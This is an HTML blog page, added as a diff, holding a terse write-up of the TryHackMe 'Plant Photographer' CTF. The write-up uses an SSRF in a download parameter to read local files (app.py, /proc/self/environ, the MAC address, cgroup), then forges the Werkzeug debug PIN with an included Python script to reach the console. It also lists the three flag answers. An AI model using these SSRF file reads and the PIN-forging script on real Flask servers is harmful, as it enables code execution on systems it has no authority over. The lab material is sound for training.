@@ -1,0 +1,1092 @@
+<!DOCTYPE html>
+<html lang="zh-CN" data-theme="dark">
+
+<head>
+
+<meta charset="UTF-8">
+
+<meta
+    name="viewport"
+    content="width=device-width, initial-scale=1.0"
+>
+
+<title>THM PLANT PHOTOGRAPHER | SYC</title>
+
+<meta
+    name="description"
+    content="Your friend, a passionate botanist and aspiring photographer, recently launched a personal portfolio website to showcase his growing collection of rare plant photos: http..."
+>
+
+<meta
+    name="robots"
+    content="index, follow"
+>
+
+<link
+    rel="canonical"
+    href="https://syc-sigma.vercel.app/p/THM%20Plant%20Photographer"
+>
+
+<meta
+    property="og:title"
+    content="THM PLANT PHOTOGRAPHER | SYC"
+>
+
+<meta
+    property="og:description"
+    content="Your friend, a passionate botanist and aspiring photographer, recently launched a personal portfolio website to showcase his growing collection of rare plant photos: http..."
+>
+
+<meta
+    property="og:type"
+    content="article"
+>
+
+<meta
+    property="og:url"
+    content="https://syc-sigma.vercel.app/p/THM%20Plant%20Photographer"
+>
+
+<meta
+    property="og:site_name"
+    content="SYC"
+>
+
+<meta
+    name="twitter:card"
+    content="summary"
+>
+
+<meta
+    name="twitter:title"
+    content="THM PLANT PHOTOGRAPHER | SYC"
+>
+
+<meta
+    name="twitter:description"
+    content="Your friend, a passionate botanist and aspiring photographer, recently launched a personal portfolio website to showcase his growing collection of rare plant photos: http..."
+>
+
+<link rel="icon" type="image/png" href="/favicon.png">
+
+<link
+    rel="shortcut icon"
+    href="/favicon.ico"
+    type="image/x-icon"
+>
+
+<link
+    href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;700&family=Fira+Code&display=swap"
+    rel="stylesheet"
+>
+
+<link
+    rel="stylesheet"
+    href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/styles/github-dark.min.css"
+    id="hljs-style"
+>
+
+<script
+    src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/highlight.min.js"
+    defer
+></script>
+
+
+<style>
+
+:root[data-theme="dark"] {
+    --bg-1: #050505;
+    --bg-2: #0a0c1a;
+    --bg-3: #120d1a;
+    --text-main: #ffffff;
+    --text-dim: rgba(255, 255, 255, 0.5);
+    --accent: #ffffff;
+    --canvas-opacity: 0.9;
+    --code-bg: rgba(0, 0, 0, 0.5);
+}
+
+:root[data-theme="light"] {
+    --bg-1: #fdfdfd;
+    --bg-2: #f0f4ff;
+    --bg-3: #f9f0ff;
+    --text-main: #000000;
+    --text-dim: rgba(0, 0, 0, 0.5);
+    --accent: #000000;
+    --canvas-opacity: 0.5;
+    --code-bg: rgba(0, 0, 0, 0.05);
+}
+
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    transition:
+        background-color 0.6s,
+        color 0.4s;
+}
+
+html {
+    scroll-behavior: smooth;
+}
+
+body {
+    background:
+        linear-gradient(
+            125deg,
+            var(--bg-1),
+            var(--bg-2),
+            var(--bg-3),
+            var(--bg-1)
+        );
+
+    background-size: 400% 400%;
+
+    animation:
+        spaceFlow 25s ease infinite;
+
+    color: var(--text-main);
+
+    font-family:
+        'Inter',
+        -apple-system,
+        BlinkMacSystemFont,
+        sans-serif;
+
+    line-height: 1.8;
+
+    overflow-x: hidden;
+}
+
+@keyframes spaceFlow {
+    0% {
+        background-position: 0% 50%;
+    }
+
+    50% {
+        background-position: 100% 50%;
+    }
+
+    100% {
+        background-position: 0% 50%;
+    }
+}
+
+#article-canvas {
+    position: fixed;
+    top: 0;
+    left: 0;
+
+    width: 100%;
+    height: 100%;
+
+    z-index: -1;
+
+    pointer-events: none;
+
+    opacity: var(--canvas-opacity);
+}
+
+.theme-toggle {
+    position: fixed;
+
+    bottom: 30px;
+    right: 30px;
+
+    width: 48px;
+    height: 48px;
+
+    border-radius: 50%;
+
+    background: var(--text-main);
+    color: var(--bg-1);
+
+    border: none;
+
+    cursor: pointer;
+
+    z-index: 2000;
+
+    display: flex;
+    align-items: center;
+    justify-content: center;
+
+    font-family: 'Fira Code';
+
+    font-size: 10px;
+
+    font-weight: bold;
+
+    box-shadow:
+        0 10px 30px rgba(0,0,0,0.2);
+}
+
+#progress {
+    position: fixed;
+
+    top: 0;
+    left: 0;
+
+    height: 3px;
+
+    background: var(--accent);
+
+    width: 0%;
+
+    z-index: 2000;
+}
+
+nav {
+    padding: 25px 40px;
+
+    backdrop-filter: blur(20px);
+    -webkit-backdrop-filter: blur(20px);
+
+    position: sticky;
+
+    top: 0;
+
+    z-index: 1000;
+
+    display: flex;
+
+    justify-content: space-between;
+
+    align-items: center;
+}
+
+nav a {
+    color: var(--text-dim);
+
+    text-decoration: none;
+
+    font-size: 11px;
+
+    font-family: 'Fira Code';
+
+    letter-spacing: 1px;
+}
+
+nav a:hover {
+    color: var(--text-main);
+}
+
+.content-wrapper {
+    max-width: 900px;
+
+    margin: 40px auto;
+
+    padding: 40px 24px;
+
+    min-height: 80vh;
+}
+
+.article-header {
+    margin-bottom: 70px;
+}
+
+.article-header h1 {
+    font-size:
+        clamp(32px, 7vw, 64px);
+
+    font-weight: 700;
+
+    color: var(--text-main);
+
+    letter-spacing: -4px;
+
+    line-height: 1;
+
+    text-transform: uppercase;
+}
+
+.article-meta {
+    margin-top: 20px;
+
+    color: var(--text-dim);
+
+    font-family: 'Fira Code';
+
+    font-size: 11px;
+
+    letter-spacing: 1px;
+}
+
+.markdown-body {
+    overflow-wrap: break-word;
+}
+
+.markdown-body img {
+    max-width: 100%;
+
+    height: auto;
+
+    border-radius: 12px;
+
+    margin: 30px 0;
+
+    display: block;
+
+    box-shadow:
+        0 20px 50px rgba(0,0,0,0.1);
+}
+
+.markdown-body h1 {
+    font-size: 38px;
+
+    margin: 50px 0 20px;
+
+    color: var(--text-main);
+}
+
+.markdown-body h2 {
+    font-size: 28px;
+
+    margin: 50px 0 20px;
+
+    color: var(--text-main);
+
+    border-bottom:
+        1px solid var(--text-dim);
+
+    padding-bottom: 8px;
+}
+
+.markdown-body h3 {
+    font-size: 22px;
+
+    margin: 40px 0 15px;
+
+    color: var(--text-main);
+}
+
+.markdown-body p {
+    margin-bottom: 25px;
+
+    font-size: 17px;
+
+    opacity: 0.85;
+}
+
+.markdown-body ul,
+.markdown-body ol {
+    margin: 20px 0 25px;
+
+    padding-left: 30px;
+}
+
+.markdown-body li {
+    margin-bottom: 8px;
+}
+
+.markdown-body a {
+    color: var(--text-main);
+
+    text-decoration:
+        underline;
+
+    text-underline-offset: 4px;
+}
+
+.markdown-body blockquote {
+    margin: 25px 0;
+
+    padding: 15px 20px;
+
+    border-left:
+        3px solid var(--text-main);
+
+    color: var(--text-dim);
+}
+
+.markdown-body pre {
+    background:
+        var(--code-bg) !important;
+
+    padding: 25px;
+
+    border:
+        1px solid var(--text-dim);
+
+    border-radius: 12px;
+
+    margin: 30px 0;
+
+    overflow-x: auto;
+
+    backdrop-filter: blur(10px);
+}
+
+.markdown-body code {
+    font-family: 'Fira Code';
+
+    font-size: 14px;
+
+    background:
+        rgba(128,128,128,0.1);
+
+    padding: 3px 6px;
+
+    border-radius: 4px;
+}
+
+.markdown-body pre code {
+    background: transparent;
+
+    padding: 0;
+}
+
+.markdown-body table {
+    width: 100%;
+
+    border-collapse: collapse;
+
+    margin: 30px 0;
+
+    overflow-x: auto;
+}
+
+.markdown-body th,
+.markdown-body td {
+    border:
+        1px solid var(--text-dim);
+
+    padding: 10px;
+
+    text-align: left;
+}
+
+.markdown-body th {
+    color: var(--text-main);
+}
+
+@media (max-width: 768px) {
+
+    .content-wrapper {
+        padding: 20px;
+    }
+
+    nav {
+        padding: 15px 20px;
+    }
+
+    .article-header h1 {
+        letter-spacing: -2px;
+    }
+
+    .markdown-body p {
+        font-size: 16px;
+    }
+}
+
+</style>
+
+</head>
+
+
+<body>
+
+<div id="progress"></div>
+
+<canvas id="article-canvas"></canvas>
+
+
+<button
+    class="theme-toggle"
+    onclick="toggleTheme()"
+>
+    MODE
+</button>
+
+
+<nav>
+
+<a href="/">
+    &lt;- BACK_TO_TERMINAL
+</a>
+
+<span
+    id="reading-id"
+    style="
+        font-family:'Fira Code';
+        font-size:10px;
+        color:var(--text-dim);
+    "
+>
+    SYSTEM: SYNCED
+</span>
+
+</nav>
+
+
+<main class="content-wrapper">
+
+<header class="article-header">
+
+<h1>
+THM PLANT PHOTOGRAPHER
+</h1>
+
+<div class="article-meta">
+    THM PLANT PHOTOGRAPHER.MD
+</div>
+
+</header>
+
+
+<article class="markdown-body">
+
+<h3><strong>THM Plant Photographer</strong></h3>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*v_7aPmsLCCEvG1VuLhjqKA.png" /></p>
+<p>Your friend, a passionate botanist and aspiring photographer, recently launched a personal portfolio website to showcase his growing collection of rare plant photos:</p>
+<p><a href="http://MACHINE_IP/">http://MACHINE_IP/</a></p>
+<p>Proud of building the site himself from scratch, he’s asked you to take a quick look and let him know if anything could be improved. Look closely at how the site wPasted image 20260331175353.png<br />
+ Your friend, a passionate botanist and aspiring photographer, recently launched a personal portfolio website to showcase his growing collection of rare plant photos:</p>
+<p>nmap at first</p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*8DxmxWJau03H8q7SlYC1OQ.png" /></p>
+<p>dirsearch</p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*WBtFSM8xeTAk00FkGi5S7A.png" /></p>
+<p>found an email</p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*aVb-69yTc2pEOum-555Wdw.png" /></p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*SmU-n-PMecWgUSqcCNwyRg.png" /></p>
+<p>so ,its clearly</p>
+<p>X-Forwarded-For: 127.0.0.1??</p>
+<p>right?</p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*dZMSsyEzhbhGY5iV1W10qA.png" /></p>
+<p>but unfortunately</p>
+<p>so,try other way</p>
+<p>download button</p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*zZEXXMokSk5Kox3WJ53FrQ.png" /></p>
+<p><strong>SSRF</strong> </p>
+<p>so, we make a request</p>
+<p><a href="http://10.49.181.141/download?server=192.168.141.70:4446&amp;id=75482342">http://10.49.181.141/download?server=192.168.141.70:4446&amp;id=75482342</a></p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*HeXfDEtYw2t82SSi9TEPwQ.png" /></p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*ExLNbMbuQUzaMV8_TwlMBA.png" /></p>
+<p>so, we got the first flag</p>
+<p><strong><em>Q1:What API key is used to retrieve files from the secure storage service?</em></strong></p>
+<p><strong><em>A1:THM{Hello_Im_just_an_API_key}</em></strong></p>
+<p>than,we try ssrf to request admin</p>
+<p><a href="http://10.49.181.141/download?server=127.0.0.1%3A80&amp;id=admin">http://10.49.181.141/download?server=127.0.0.1%3A80&amp;id=admin</a></p>
+<p>at this page ,we found the true request it make</p>
+<p>crl.setopt(crl.URL, server + ‘/public-docs-k057230990384293/’ + filename)</p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*t0IFxY3KSuQ15KP58zDtyw.png" /></p>
+<p>so ,we use</p>
+<p><a href="http://10.49.181.141/download?server=127.0.0.1/admin?%23&amp;Id=1">http://10.49.181.141/download?server=127.0.0.1/admin?%23&amp;id=1</a></p>
+<p>to cut it</p>
+<p>oh, no</p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*rle3Iu9_OIgjpvyNlzi2Ug.png" /></p>
+<p>so we use the 8087 we found before</p>
+<p>and download a pdf</p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*DVdavGzE4ntMsgJ9qA92Vg.png" /></p>
+<p>yep</p>
+<p><strong><em>Q2:What is the flag in the admin section of the website?</em></strong></p>
+<p><strong><em>A2:THM{c4n_i_haz_flagz_plz?}</em></strong></p>
+<p>we use try to found something</p>
+<p><a href="http://10.49.181.141/download?server=file:///usr/src/app/app.py%23&amp;id=1">http://10.49.181.141/download?server=file:///usr/src/app/app.py%23&amp;id=1</a></p>
+<p>but what we download is a pdf,so use </p>
+<p>curl -s ‘<a href="http://10.49.181.141/download?server=file:///usr/src/app/app.py%23&amp;id=1%27">http://10.49.181.141/download?server=file:///usr/src/app/app.py%23&amp;id=1'</a> -o-</p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*R7AUVFqbxzUuVj-t4GYH7g.png" /></p>
+<p>we found a very important detail</p>
+<p>if <strong>name</strong> == “<strong>main</strong>”:<br />
+ app.run(host=’0.0.0.0', port=8087, debug=True)</p>
+<p>so we can found /console</p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*lzBNG7d4Sp1mGxa05OgfIg.png" /></p>
+<p>and more important pin could be found</p>
+<p>Flask 的 debug PIN 不是随机的，是用服务器固定信息算出来的，这台机器我们已经能读文件，所以直接算就能出 PIN！<br />
+需要 4 个关键信息（这题里全都能拿到）：<br />
+username 用户名<br />
+modname 模块名（固定 flask.app）<br />
+appid 应用 ID（固定 Flask）<br />
+绝对路径：/usr/src/app/app.py<br />
+机器码 /etc/machine-id（这题能读）<br />
+网卡地址 /sys/class/net/eth0/address（这题能读）</p>
+<p>so use</p>
+<p>curl -s ‘<a href="http://10.49.181.141/download?server=file:///proc/self/environ%23&amp;id=1%27">http://10.49.181.141/download?server=file:///proc/self/environ%23&amp;id=1'</a> -o-</p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*qyDtGT2Yj5uQhW6aTIjR3A.png" /></p>
+<p>so,username is root </p>
+<p>and we found</p>
+<p>‘/usr/local/lib/python3.10/site-packages/flask/app.py’</p>
+<p>at error page before</p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*FxPsvaDvWakDR1FWCOhzUQ.png" /></p>
+<p>curl -s ‘<a href="http://10.49.181.141/download?server=file:///sys/class/net/eth0/address%23&amp;id=1%27">http://10.49.181.141/download?server=file:///sys/class/net/eth0/address%23&amp;id=1'</a> -o-</p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*ImuEnBNR7Vypb_3eRGY1tQ.png" /></p>
+<p>translate</p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*1UArTCde5gGY6OHRvCgtEg.png" /></p>
+<p>2485378088962</p>
+<p>at last the machine id</p>
+<p>we cant found it ,with some check,we found a right way to fullfill</p>
+<p><strong>Werkzeug was</strong><code>**0.16.0**</code></p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*-UGWrEGK6m4ivSbv-aF-VQ.png" /></p>
+<p>so, we </p>
+<p>curl -s ‘http://10.49.181.141/download?server=file:///proc/self/cgroup%23&amp;id=1' -o-</p>
+<p>to found it</p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*qKXdaai-Z-cYgHDVwhubyQ.png" /></p>
+<p>77c09e05c4a947224997c3baa49e5edf161fd116568e90a28a60fca6fde049ca</p>
+<p>here is what we use
+————————————————————————————————
+import hashlib
+from itertools import chain</p>
+<p>probably_public_bits = [
+    'root',
+    'flask.app',
+    'Flask',
+    '/usr/local/lib/python3.10/site-packages/flask/app.py'
+]</p>
+<p>private_bits = [
+    '2485378088962',
+    '77c09e05c4a947224997c3baa49e5edf161fd116568e90a28a60fca6fde049ca'
+]</p>
+<p>h = hashlib.md5()</p>
+<p>for bit in chain(probably_public_bits, private_bits):
+    if not bit:
+        continue
+    if isinstance(bit, str):
+        bit = bit.encode('utf-8')
+    h.update(bit)
+h.update(b'cookiesalt')</p>
+<p>cookie_name = '__wzd' + h.hexdigest()[:20]</p>
+<p>num = None
+if num is None:
+    h.update(b'pinsalt')
+    num = ('%09d' % int(h.hexdigest(), 16))[:9]</p>
+<p>rv = None
+if rv is None:
+    for group_size in 5, 4, 3:
+        if len(num) % group_size == 0:
+            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
+                          for x in range(0, len(num), group_size))
+            break
+    else:
+        rv = num</p>
+<p>print(rv)
+————————————————————————————————</p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*K1EOkF6zA2f5im-LL9jqXA.png" /></p>
+<p>so try this</p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*qwwnlKAmzgGMwoUUF3IMsg.png" /></p>
+<p>wow</p>
+<p><img alt="" src="https://cdn-images-1.medium.com/max/1000/1*ydgUb34mj0O8_IDbXphHaA.png" /></p>
+<p>we found the third flag</p>
+<p><strong><em>Q3:What flag is stored in a text file in the server’s web directory?</em></strong></p>
+<p><strong><em>A3:THM{SSRF2RCE_2_1337_4_M3}</em></strong></p>
+
+</article>
+
+</main>
+
+
+<script>
+
+/* ==========================================================
+   Theme
+   ========================================================== */
+
+function toggleTheme() {
+
+    const root =
+        document.documentElement;
+
+    const target =
+        root.getAttribute('data-theme') === 'dark'
+            ? 'light'
+            : 'dark';
+
+    root.setAttribute(
+        'data-theme',
+        target
+    );
+
+    localStorage.setItem(
+        'theme',
+        target
+    );
+
+    const style =
+        document.getElementById(
+            'hljs-style'
+        );
+
+    if (style) {
+
+        style.href =
+            target === 'dark'
+                ? "https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/styles/github-dark.min.css"
+                : "https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/styles/github.min.css";
+    }
+}
+
+
+/* ==========================================================
+   Restore Theme
+   ========================================================== */
+
+try {
+
+    document.documentElement
+        .setAttribute(
+            'data-theme',
+            localStorage.getItem('theme') || 'dark'
+        );
+
+} catch (e) {
+
+    document.documentElement
+        .setAttribute(
+            'data-theme',
+            'dark'
+        );
+}
+
+
+/* ==========================================================
+   Code Highlight
+   ========================================================== */
+
+window.addEventListener(
+    'load',
+    () => {
+
+        if (
+            window.hljs
+        ) {
+
+            document
+                .querySelectorAll(
+                    'pre code'
+                )
+                .forEach(
+                    (el) => {
+                        hljs.highlightElement(el);
+                    }
+                );
+        }
+
+    }
+);
+
+
+/* ==========================================================
+   Reading ID
+   ========================================================== */
+
+document
+    .getElementById('reading-id')
+    .innerText =
+        'SYSTEM: THM PLANT PHOTOGRAPHER.MD';
+
+
+/* ==========================================================
+   Reading Progress
+   ========================================================== */
+
+window.addEventListener(
+    'scroll',
+    () => {
+
+        const winScroll =
+            document.documentElement.scrollTop;
+
+        const height =
+            document.documentElement.scrollHeight -
+            document.documentElement.clientHeight;
+
+        const percentage =
+            height > 0
+                ? (winScroll / height) * 100
+                : 0;
+
+        document
+            .getElementById('progress')
+            .style.width =
+                percentage + '%';
+
+    }
+);
+
+
+/* ==========================================================
+   Dynamic Background
+   ========================================================== */
+
+const canvas =
+    document.getElementById(
+        'article-canvas'
+    );
+
+const ctx =
+    canvas.getContext('2d');
+
+let fluidNodes = [];
+
+let trailParticles = [];
+
+const mouse = {
+    x: -500,
+    y: -500
+};
+
+
+function initCanvas() {
+
+    canvas.width =
+        window.innerWidth;
+
+    canvas.height =
+        window.innerHeight;
+
+    fluidNodes =
+        Array.from(
+            { length: 3 },
+            () => ({
+
+                x:
+                    Math.random() *
+                    canvas.width,
+
+                y:
+                    Math.random() *
+                    canvas.height,
+
+                vx:
+                    (Math.random() - 0.5) *
+                    0.4,
+
+                vy:
+                    (Math.random() - 0.5) *
+                    0.4,
+
+                size:
+                    Math.random() *
+                    (canvas.width * 0.4) +
+                    canvas.width * 0.3
+            })
+        );
+}
+
+
+window.onmousemove =
+    (e) => {
+
+        mouse.x =
+            e.clientX;
+
+        mouse.y =
+            e.clientY;
+
+        for (
+            let i = 0;
+            i < 2;
+            i++
+        ) {
+
+            trailParticles.push(
+                new Particle(
+                    mouse.x,
+                    mouse.y
+                )
+            );
+        }
+    };
+
+
+class Particle {
+
+    constructor(x, y) {
+
+        this.x = x;
+
+        this.y = y;
+
+        this.vx =
+            (Math.random() - 0.5) *
+            1.5;
+
+        this.vy =
+            (Math.random() - 0.5) *
+            1.5;
+
+        this.life = 1.0;
+
+        this.decay =
+            0.015 +
+            Math.random() * 0.02;
+
+        this.size =
+            Math.random() * 2.5 +
+            0.5;
+    }
+
+    update() {
+
+        this.x += this.vx;
+
+        this.y += this.vy;
+
+        this.life -= this.decay;
+    }
+
+    draw(color) {
+
+        ctx.fillStyle =
+            `rgba(${color}, ${this.life * 0.4})`;
+
+        ctx.beginPath();
+
+        ctx.arc(
+            this.x,
+            this.y,
+            this.size,
+            0,
+            Math.PI * 2
+        );
+
+        ctx.fill();
+    }
+}
+
+
+function draw() {
+
+    const isDark =
+        document.documentElement
+            .getAttribute(
+                'data-theme'
+            ) === 'dark';
+
+    ctx.fillStyle =
+        isDark
+            ? "rgba(5, 5, 5, 0.15)"
+            : "rgba(253, 253, 253, 0.15)";
+
+    ctx.fillRect(
+        0,
+        0,
+        canvas.width,
+        canvas.height
+    );
+
+    ctx.globalCompositeOperation =
+        isDark
+            ? "lighter"
+            : "multiply";
+
+
+    const colorRGB =
+        isDark
+            ? "60, 70, 100"
+            : "200, 210, 240";
+
+
+    fluidNodes.forEach(
+        node => {
+
+            node.x += node.vx;
+
+            node.y += node.vy;
+
+
+            if (
+                node.x < 0 ||
+                node.x > canvas.width
+            ) {
+                node.vx *= -1;
+            }
+
+
+            if (
+                node.y < 0 ||
+                node.y > canvas.height
+            ) {
+                node.vy *= -1;
+            }
+
+
+            const g =
+                ctx.createRadialGradient(
+                    node.x,
+                    node.y,
+                    0,
+                    node.x,
+                    node.y,
+                    node.size
+                );
+
+
+            g.addColorStop(
+                0,
+                `rgba(${colorRGB}, 0.3)`
+            );
+
+            g.addColorStop(
+                1,
+                "transparent"
+            );
+
+
+            ctx.fillStyle = g;
+
+            ctx.beginPath();
+
+            ctx.arc(
+                node.x,
+                node.y,
+                node.size,
+                0,
+                Math.PI * 2
+            );
+
+            ctx.fill();
+
+        }
+    );
+
+
+    ctx.globalCompositeOperation =
+        "source-over";
+
+
+    const particleRGB =
+        isDark
+            ? "255, 255, 255"
+            : "0, 0, 0";
+
+
+    trailParticles.forEach(
+        (p, i) => {
+
+            p.update();
+
+            p.draw(
+                particleRGB
+            );
+
+            if (
+                p.life <= 0
+            ) {
+                trailParticles.splice(
+                    i,
+                    1
+                );
+            }
+        }
+    );
+
+
+    requestAnimationFrame(
+        draw
+    );
+}
+
+
+window.addEventListener(
+    'resize',
+    initCanvas
+);
+
+initCanvas();
+
+draw();
+
+</script>
+
+</body>
+
+</html>
